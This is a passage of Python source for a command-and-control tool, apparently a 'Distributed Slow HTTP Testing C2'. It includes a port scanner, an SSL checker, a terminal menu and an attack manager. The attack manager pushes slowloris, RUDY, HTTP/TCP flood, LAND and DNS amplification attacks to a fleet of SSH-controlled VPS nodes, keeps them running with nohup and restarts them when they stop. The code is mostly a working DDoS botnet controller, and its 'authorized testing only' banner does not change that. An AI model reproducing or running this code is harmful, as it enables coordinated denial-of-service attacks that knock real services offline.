            465: "SMTPS",
            587: "SMTP",
            993: "IMAPS",
            995: "POP3S",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            8080: "HTTP-Proxy",
            8443: "HTTPS-Alt"
        }
        
        # Scan ports
        for port in ports_to_scan:
            try:
                # Create socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                # Try to connect
                result = s.connect_ex((target, port))
                
                # If port is open
                if result == 0:
                    # Try to get banner
                    banner = None
                    try:
                        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
                    except:
                        pass
                    
                    # Get service name
                    service = common_services.get(port, "unknown")
                    
                    # Add to results
                    results["open_ports"].append({
                        "port": port,
                        "service": service,
                        "banner": banner
                    })
                
                # Close socket
                s.close()
                
            except Exception as e:
                logger.debug(f"Error scanning port {port}: {str(e)}")
        
        # End timer
        end_time = time.time()
        results["scan_time"] = end_time - start_time
        
        return results
    
    def get_ssl_info(self, target, port=443):
        """Get SSL/TLS information for target"""
        results = {
            "target": target,
            "port": port,
            "has_ssl": False,
            "subject": None,
            "issuer": None,
            "version": None,
            "serial_number": None,
            "not_before": None,
            "not_after": None,
            "is_expired": None,
            "days_left": None,
            "protocols": {
                "SSLv2": False,
                "SSLv3": False,
                "TLSv1.0": False,
                "TLSv1.1": False,
                "TLSv1.2": False,
                "TLSv1.3": False
            },
            "cipher_suites": [],
            "security_checks": {
                "heartbleed": {"pass": True, "message": ""},
                "poodle": {"pass": True, "message": ""},
                "freak": {"pass": True, "message": ""},
                "logjam": {"pass": True, "message": ""},
                "beast": {"pass": True, "message": ""},
                "sweet32": {"pass": True, "message": ""}
            },
            "error": None
        }
        
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Connect to target
            sock.connect((target, port))
            
            # Wrap with SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Try to establish SSL connection
            ssl_sock = context.wrap_socket(sock, server_hostname=target)
            
            # Get certificate
            cert = ssl_sock.getpeercert(True)
            x509 = ssl.DER_cert_to_PEM_cert(cert)
            
            # Mark as having SSL
            results["has_ssl"] = True
            
            # Extract certificate information
            # This is a simplified version - in a real implementation, you'd use a library like cryptography
            # to properly parse the certificate
            
            # Extract subject
            subject_start = x509.find("/CN=")
            if subject_start != -1:
                subject_end = x509.find("\n", subject_start)
                results["subject"] = x509[subject_start + 4:subject_end].strip()
            
            # Extract issuer
            issuer_start = x509.find("Issuer: ")
            if issuer_start != -1:
                issuer_end = x509.find("\n", issuer_start)
                results["issuer"] = x509[issuer_start + 8:issuer_end].strip()
            
            # Extract validity
            not_before_start = x509.find("Not Before: ")
            if not_before_start != -1:
                not_before_end = x509.find("\n", not_before_start)
                results["not_before"] = x509[not_before_start + 12:not_before_end].strip()
            
            not_after_start = x509.find("Not After : ")
            if not_after_start != -1:
                not_after_end = x509.find("\n", not_after_start)
                results["not_after"] = x509[not_after_start + 12:not_after_end].strip()
            
            # Check if expired
            if results["not_after"]:
                try:
                    # Parse date
                    not_after = datetime.strptime(results["not_after"], "%b %d %H:%M:%S %Y %Z")
                    now = datetime.now()
                    
                    # Check if expired
                    results["is_expired"] = now > not_after
                    
                    # Calculate days left
                    days_left = (not_after - now).days
                    results["days_left"] = days_left
                except Exception as e:
                    logger.debug(f"Error parsing certificate date: {str(e)}")
            
            # Check supported protocols
            protocols = [
                ("SSLv3", ssl.PROTOCOL_SSLv23),
                ("TLSv1.0", ssl.PROTOCOL_TLSv1),
                ("TLSv1.1", ssl.PROTOCOL_TLSv1_1),
                ("TLSv1.2", ssl.PROTOCOL_TLSv1_2)
            ]
            
            for protocol_name, protocol in protocols:
                try:
                    protocol_context = ssl.SSLContext(protocol)
                    protocol_context.check_hostname = False
                    protocol_context.verify_mode = ssl.CERT_NONE
                    
                    protocol_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    protocol_sock.settimeout(2)
                    protocol_sock.connect((target, port))
                    
                    protocol_ssl_sock = protocol_context.wrap_socket(protocol_sock, server_hostname=target)
                    protocol_ssl_sock.close()
                    
                    results["protocols"][protocol_name] = True
                    
                    # Security checks
                    if protocol_name == "SSLv3":
                        results["security_checks"]["poodle"]["pass"] = False
                        results["security_checks"]["poodle"]["message"] = "SSLv3 is vulnerable to POODLE attack"
                    
                    if protocol_name in ["TLSv1.0", "TLSv1.1"]:
                        results["security_checks"]["beast"]["pass"] = False
                        results["security_checks"]["beast"]["message"] = f"{protocol_name} is potentially vulnerable to BEAST attack"
                    
                except:
                    pass
            
            # Get cipher suites
            try:
                # This is a simplified approach - in a real implementation, you'd use a library like cryptography
                # to properly enumerate supported cipher suites
                cipher = ssl_sock.cipher()
                if cipher:
                    results["cipher_suites"].append(f"{cipher[0]} - {cipher[1]} bits - {cipher[2]}")
                
                # Check for weak ciphers
                if "RC4" in str(cipher) or "DES" in str(cipher):
                    results["security_checks"]["sweet32"]["pass"] = False
                    results["security_checks"]["sweet32"]["message"] = "Weak cipher detected"
            except:
                pass
            
            # Close connection
            ssl_sock.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results

class TerminalHelper:
    """Helper class for terminal UI operations"""
    
    def __init__(self):
        """Initialize terminal helper"""
        self.last_progress = 0
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self, version):
        """Print the application banner"""
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                         ADVANCED EDITION v{version}                              ║
╚════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}
"""
        print(banner)
    
    def input_with_prompt(self, prompt, required=True, validate_func=None):
        """Get user input with validation"""
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                
                if not required and not value:
                    return value
                
                if required and not value:
                    print(f"{Colors.RED}This field is required{Colors.RESET}")
                    continue
                
                if validate_func:
                    if isinstance(validate_func, tuple):
                        # Unpack function and error message
                        func, error_msg = validate_func
                        valid = func(value)
                        if not valid:
                            print(f"{Colors.RED}{error_msg}{Colors.RESET}")
                            continue
                    else:
                        # Just a function that returns True/False
                        valid = validate_func(value)
                        if not valid:
                            print(f"{Colors.RED}Invalid input{Colors.RESET}")
                            continue
                
                return value
            except KeyboardInterrupt:
                return None
    
    def print_progress_bar(self, iteration, total, prefix='', suffix='', length=50, fill='█'):
        """Print a progress bar"""
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
        
        # Print New Line on Complete
        if iteration == total:
            print()
    
    def print_table(self, headers, data, padding=2):
        """Print a formatted table"""
        if not data:
            return
        
        # Calculate column widths
        col_widths = [len(h) for h in headers]
        for row in data:
            for i, cell in enumerate(row):
                if i < len(col_widths):
                    col_widths[i] = max(col_widths[i], len(str(cell)))
        
        # Add padding
        col_widths = [w + padding for w in col_widths]
        
        # Print headers
        header_row = ""
        for i, header in enumerate(headers):
            header_row += f"{Colors.BOLD}{header}{Colors.RESET}".ljust(col_widths[i])
        print(header_row)
        
        # Print separator
        print("-" * sum(col_widths))
        
        # Print data
        for row in data:
            row_str = ""
            for i, cell in enumerate(row):
                if i < len(col_widths):
                    # Handle ANSI color codes in cell content
                    if isinstance(cell, str) and (Colors.RED in cell or Colors.GREEN in cell or Colors.YELLOW in cell):
                        # For colored cells, we need to account for the invisible ANSI codes
                        visible_len = len(cell) - (len(Colors.RED) + len(Colors.RESET))
                        row_str += f"{cell}".ljust(col_widths[i] + (len(Colors.RED) + len(Colors.RESET)))
                    else:
                        row_str += f"{cell}".ljust(col_widths[i])
            print(row_str)
    
    def print_status(self, message, status, success_word="SUCCESS", failure_word="FAILED"):
        """Print a status message with colored status indicator"""
        if status:
            status_str = f"{Colors.GREEN}{success_word}{Colors.RESET}"
        else:
            status_str = f"{Colors.RED}{failure_word}{Colors.RESET}"
        
        print(f"{message} [{status_str}]")
    
    def confirm_action(self, prompt):
        """Ask for confirmation before proceeding"""
        response = input(f"{Colors.YELLOW}{prompt} (y/N): {Colors.RESET}").strip().lower()
        return response == 'y'

class AttackManager:
    """Manages attack operations across VPS nodes"""
    
    def __init__(self, ssh_manager, db_manager):
        """Initialize attack manager with SSH and database managers"""
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
    
    def get_available_attack_methods(self):
        """Get available attack methods"""
        return {
            'slowloris': 'Slowloris (Keep-Alive)',
            'slow_post': 'R.U.D.Y (Slow POST)',
            'slow_read': 'Slow Read',
            'http_flood': 'HTTP Flood',
            'ssl_exhaust': 'SSL Exhaustion',
            'tcp_flood': 'TCP Flood',
            'land': 'LAND Attack',
            'dns_amplification': 'DNS Amplification'
        }
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
            use_ssl = target_url.startswith('https://')
        else:
            target_host = target_url.split(':')[0].split('/')[0]
            use_ssl = False
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters,
            'use_ssl': use_ssl
        }
        
        logger.info(f"Launching {attack_type} attack on {target_host}")
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection status and reconnect if necessary
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
                
                vps_data = all_vps_data.get(vps_ip)
                if vps_data:
                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
                        vps_data['ip_address'], vps_data['username'], vps_data['password'], vps_data['ssh_port']
                    )
                    if reconnect_success:
                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
                        self.db_manager.update_vps_status(vps_ip, 'online')
                    else:
                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
                        continue
                else:
                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
                    continue
            
            # Build attack command
            cmd = self._build_attack_command(target_url, attack_type, parameters)
            
            # Execute with longer timeout and better error detection
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            if success:
                print(f"{Colors.GREEN}LAUNCHED{Colors.RESET}")
                success_count += 1
                
                # Start monitoring thread for this VPS
                self._start_monitoring_thread(session_id, vps_ip)
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_vps.append(f"{vps_ip}: {output}")
        
        # Update attack status in database
        if success_count > 0:
            self.db_manager.update_attack_status(session_id, 'running')
            
            # Start a thread to monitor the attack duration
            duration = parameters.get('duration', 300)  # Default 5 minutes
            threading.Thread(target=self._monitor_attack_duration, args=(session_id, duration), daemon=True).start()
            
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            
            if failed_vps:
                print(f"\n{Colors.YELLOW}[WARNING] Failed to launch on {len(failed_vps)} VPS nodes:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  - {failure}")
            
            return True
        else:
            self.db_manager.update_attack_status(session_id, 'failed', json.dumps({"errors": failed_vps}))
            print(f"\n{Colors.RED}[ERROR] Failed to launch attack on any VPS nodes{Colors.RESET}")
            return False
    
    def _build_attack_command(self, target_url, attack_type, parameters):
        """Build the attack command to execute on VPS"""
        
        # Base command with nohup to keep running after SSH disconnects
        cmd = "cd ~/slowhttp_agent && nohup python3 agent.py "
        
        # Add target
        cmd += f"--target &quot;{target_url}&quot; "
        
        # Add attack type
        cmd += f"--attack-type {attack_type} "
        
        # Add common parameters
        connections = parameters.get('connections', 100)
        cmd += f"--connections {connections} "
        
        duration = parameters.get('duration', 300)
        cmd += f"--duration {duration} "
        
        # Add attack-specific parameters
        if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
            delay = parameters.get('delay', 10)
            cmd += f"--delay {delay} "
        
        if attack_type == 'http_flood':
            requests = parameters.get('requests', 1000)
            cmd += f"--requests {requests} "
        
        if attack_type == 'dns_amplification':
            target_ip = parameters.get('target_ip')
            if target_ip:
                cmd += f"--target-ip {target_ip} "
        
        # Redirect output to log file and run in background
        cmd += f"> attack_{attack_type}_{int(time.time())}.log 2>&1 & echo $!"
        
        return cmd
    
    def _start_monitoring_thread(self, session_id, vps_ip):
        """Start a thread to monitor attack progress on a VPS"""
        if session_id not in self.monitoring_threads:
            self.monitoring_threads[session_id] = {}
        
        # Create and start monitoring thread
        thread = threading.Thread(
            target=self._monitor_attack_vps,
            args=(session_id, vps_ip),
            daemon=True
        )
        thread.start()
        
        self.monitoring_threads[session_id][vps_ip] = thread
    
    def _monitor_attack_vps(self, session_id, vps_ip):
        """Monitor attack progress on a specific VPS"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return
        
        # Get monitoring interval based on attack type
        if attack_info['attack_type'] in ['slowloris', 'slow_post', 'slow_read']:
            interval = 10  # Slower attacks need less frequent monitoring
        else:
            interval = 5   # Faster attacks need more frequent monitoring
        
        while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
            try:
                # Get attack stats from VPS
                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep"
                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                if not success or not output:
                    # Process not found, attack might have stopped
                    logger.warning(f"Attack process not found on {vps_ip}")
                    
                    # Add result with error
                    self.db_manager.add_attack_result(
                        session_id, vps_ip, 0, 0, 0, 1, None, None, None, 'error'
                    )
                    
                    # Try to restart the attack
                    self._attempt_restart_attack(session_id, vps_ip)
                    
                    # Sleep before next check
                    time.sleep(interval)
                    continue
                
                # Get CPU and memory usage
                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                cpu_usage = None
                memory_usage = None
                
                if success and resource_output:
                    parts = resource_output.strip().split()
                    if len(parts) >= 2:
                        try:
                            cpu_usage = float(parts[0])
                            memory_usage = float(parts[1])
                        except ValueError:
                            pass
                
                # Try to get attack stats from log file
                cmd = "cd ~/slowhttp_agent && cat attack_*.log | grep -a 'Status:' | tail -1"
                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                connections_active = 0
                packets_sent = 0
                bytes_sent = 0
                error_count = 0
                response_codes = {}
                
                if success and stats_output:
                    # Parse stats from output
                    # Example: "[*] Status: 150 connections active, 1500 packets sent"
                    try:
                        # Extract connections
                        conn_match = re.search(r'(\d+) connections active', stats_output)
                        if conn_match:
                            connections_active = int(conn_match.group(1))
                        
                        # Extract packets
                        packets_match = re.search(r'(\d+) packets sent', stats_output)
                        if packets_match:
                            packets_sent = int(packets_match.group(1))
                        
                        # Extract bytes (if available)
                        bytes_match = re.search(r'(\d+) bytes sent', stats_output)
                        if bytes_match:
                            bytes_sent = int(bytes_match.group(1))
                        
                        # Extract errors (if available)
                        error_match = re.search(r'(\d+) errors', stats_output)
                        if error_match:
                            error_count = int(error_match.group(1))
                        
                        # Extract response codes (if available)
                        codes_match = re.search(r'Response codes: (.*)', stats_output)
                        if codes_match:
                            codes_str = codes_match.group(1)
                            code_parts = codes_str.split(', ')
                            for part in code_parts:
                                code, count = part.split(': ')
                                response_codes[code] = int(count)
                    except Exception as e:
                        logger.error(f"Error parsing stats from {vps_ip}: {str(e)}")
                
                # Add result to database
                self.db_manager.add_attack_result(
                    session_id, vps_ip, connections_active, packets_sent, bytes_sent,
                    error_count, cpu_usage, memory_usage, json.dumps(response_codes), 'running'
                )
                
            except Exception as e:
                logger.error(f"Error monitoring attack on {vps_ip}: {str(e)}")
            
            # Sleep before next check
            time.sleep(interval)
    
    def _attempt_restart_attack(self, session_id, vps_ip):
        """Attempt to restart a failed attack on a VPS"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            return False
        
        logger.info(f"Attempting to restart attack on {vps_ip}")
        
        # Build attack command
        cmd = self._build_attack_command(
            attack_info['target_url'],
            attack_info['attack_type'],
            attack_info['parameters']
        )
        
        # Execute with longer timeout
        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
        
        if success:
            logger.info(f"Successfully restarted attack on {vps_ip}")
            return True
        else:
            logger.error(f"Failed to restart attack on {vps_ip}: {output}")
            return False
    
    def _monitor_attack_duration(self, session_id, duration):
        """Monitor attack duration and stop when time is up"""
        logger.info(f"Monitoring attack {session_id} for {duration} seconds")
        
        # Sleep for the duration
        time.sleep(duration)
        
        # Check if attack is still active
        if session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
            logger.info(f"Attack {session_id} duration reached, stopping")
            self.stop_attack(session_id)
    
    def stop_attack(self, session_id):
        """Stop an attack across all VPS nodes"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            logger.warning(f"Attack {session_id} not found")
            return False
        
        logger.info(f"Stopping attack {session_id} on {len(attack_info['vps_list'])} VPS nodes")
        print(f"\n{Colors.YELLOW}[STOPPING] Attack {session_id} on {len(attack_info['vps_list'])} VPS nodes{Colors.RESET}")
        
        # Update attack status
        attack_info['status'] = 'stopping'
        
        # Stop attack on each VPS
        for vps_ip in attack_info['vps_list']:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Kill all agent.py processes
            cmd = "pkill -f 'python3 agent.py'"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
            
            if success:
                print(f"{Colors.GREEN}STOPPED{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}FAILED{Colors.RESET}")
        
        # Update attack status in database
        self.db_manager.update_attack_status(session_id, 'completed')
        
        # Remove from active attacks
        if session_id in self.active_attacks:
            del self.active_attacks[session_id]
        
        # Stop monitoring threads
        if session_id in self.monitoring_threads:
            # Threads will terminate on their own when they check active_attacks
            del self.monitoring_threads[session_id]
        
        print(f"\n{Colors.GREEN}[SUCCESS] Attack {session_id} stopped{Colors.RESET}")
        return True
    
    def get_attack_status(self, session_id):
        """Get current status of an attack"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            # Check database for completed attacks
            session = self.db_manager.get_attack_session(session_id)
            if session:
                return {
                    'status': session['status'],
                    'target_host': session['target_host'],
                    'target_url': session['target_url'],
                    'attack_type': session['attack_type'],
                    'start_time': session['start_time'],
                    'end_time': session['end_time']
                }
            return None
        
        # Get latest results for each VPS
        results = self.db_manager.get_attack_results(session_id)
        
        # Aggregate results
        total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
        total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
        total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
        total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
        
        # Merge response codes
        response_codes = {}
        for result in results:
            if result['response_codes']:
                try:
                    codes = json.loads(result['response_codes'])
                    for code, count in codes.items():
                        if code not in response_codes:
                            response_codes[code] = 0
                        response_codes[code] += count
                except:
                    pass
        
        # Calculate duration
        start_time = attack_info['start_time']
        duration = (datetime.now() - start_time).total_seconds()
        
        return {
            'status': attack_info['status'],
            'target_host': attack_info['target_host'],
            'target_url': attack_info['target_url'],
            'attack_type': attack_info['attack_type'],
            'vps_count': len(attack_info['vps_list']),
            'start_time': start_time.isoformat(),
            'duration': duration,
            'total_connections': total_connections,
            'total_packets': total_packets,
            'total_bytes': total_bytes,
            'total_errors': total_errors,
            'response_codes': response_codes
        }

class SlowHTTPTUI:
    """Terminal User Interface for SlowHTTP C2 tool with improved monitoring"""
    
    def __init__(self):
        """Initialize the TUI with all required components"""
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.network_tools = NetworkTools()
        self.terminal = TerminalHelper()
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        """Handle interrupt signals"""
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        for ip in list(self.ssh_manager.connections.keys()):
            self.ssh_manager.disconnect_vps(ip)
        
        # Close database connections
        self.db_manager.close()
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def run(self):
        """Main TUI loop"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            self.print_main_menu()
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attacks_menu()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.network_tools_menu()
                elif choice == '6':
                    self.system_status_menu()
                elif choice == '0':
                    self._signal_handler(None, None)
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
            except KeyboardInterrupt:
                self._signal_handler(None, None)
            except Exception as e:
                logger.error(f"Error in main loop: {str(e)}")
                logger.error(traceback.format_exc())
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                input("Press Enter to continue...")
    
    def print_main_menu(self):
        """Print the main menu"""
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} Network Reconnaissance Tools
{Colors.GREEN}[6]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
        print(menu)
    
    def vps_management_menu(self):
        """VPS management menu"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                # Convert to list of lists for table printing
                headers = ["ID", "IP Address", "Username", "Status", "Location", "Last Seen"]
                data = []
                
                for vps in vps_list:
                    status = vps['status']
                    status_str = f"{Colors.GREEN}{status}{Colors.RESET}" if status == 'online' else f"{Colors.RED}{status}{Colors.RESET}"
                    last_seen = vps['last_seen'][:19] if vps['last_seen'] else 'Never'
                    data.append([
                        vps['id'],
                        vps['ip_address'],
                        vps['username'],
                        status_str,
                        vps['location'] or 'Unknown',
                        last_seen
                    ])
                
                self.terminal.print_table(headers, data)
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[6]{Colors.RESET} View VPS Details
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '6':
                self.view_vps_details()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        """Add a new VPS node"""
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            # Validate IP address
            def validate_ip(ip):
                return self.security_manager.validate_ip(ip), "Invalid IP address format"
                
            # Validate port number
            def validate_port(port):
                try:
                    port_num = int(port)
                    if 1 <= port_num <= 65535:
                        return True, ""
                    return False, "Port must be between 1 and 65535"
                except ValueError:
                    return False, "Port must be a number"
            
            ip = self.terminal.input_with_prompt("IP Address: ", validate_func=validate_ip)
            if not ip:
                return
            
            username = self.terminal.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.terminal.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.terminal.input_with_prompt("SSH Port (default 22): ", False, validate_port) or "22"
            port = int(port)
            
            location = self.terminal.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            tags = self.terminal.input_with_prompt("Tags (comma-separated, optional): ", False)
            tags_list = [tag.strip() for tag in tags.split(',')] if tags else []
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id, message = self.db_manager.add_vps(ip, username, encrypted_password, port, location, tags_list)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                    
                    # Get system info
                    print(f"{Colors.YELLOW}[INFO] Gathering system information...{Colors.RESET}")
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                        print(f"{Colors.GREEN}[SUCCESS] System information collected{Colors.RESET}")
                        
                        # Display system info
                        print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
                        for key, value in system_info.items():
                            print(f"  {key.capitalize()}: {value}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            logger.error(f"Error adding VPS: {str(e)}")
            logger.error(traceback.format_exc())
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        """Test connections to all VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 50)
        
        online_count = 0
        for vps in vps_list:
            ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
            print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
            
            if success:
                # Test command execution
                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
                if cmd_success:
                    print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
                    online_count += 1
                    
                    # Update system info
                    system_info = self.ssh_manager.get_system_info(ip)
                    if system_info:
                        self.db_manager.update_vps_system_info(ip, system_info)
                else:
                    print(f"{Colors.YELLOW}CONNECTED BUT CMD FAILED{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
            else:
                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
        
        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        """Deploy attack agents to all online VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
